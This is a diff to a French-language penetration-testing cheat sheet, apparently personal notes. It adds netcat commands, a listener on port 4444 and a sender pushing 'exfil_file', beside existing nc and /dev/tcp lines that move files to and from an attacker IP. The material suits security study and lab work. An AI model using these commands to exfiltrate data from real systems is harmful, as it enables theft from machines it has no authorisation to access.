@@ -169,7 +169,6 @@ sudo systemctl start ssh
 # se connecter avec scp + download file
 scp <Username>@<IP>:/<FilePath> .
 
-
 # unzip file
  gunzip -S .zip  <Decompress_FileName>
 ``` 
@@ -302,6 +301,14 @@ nc <Attaquant-IP> <Port> > <FileName>
 cat < /dev/tcp/<AttaquantIP/<Port> > <FileName>
 # alternative sender
 sudo nc -l -p <Port> -q 0 < <FileName
+
+
+
+#more quick
+# receiver
+nc -lvnp 4444 > new_file
+# sender
+nc -vn <IP> 4444 < exfil_file
 ```
 
 ###### Living off the land 
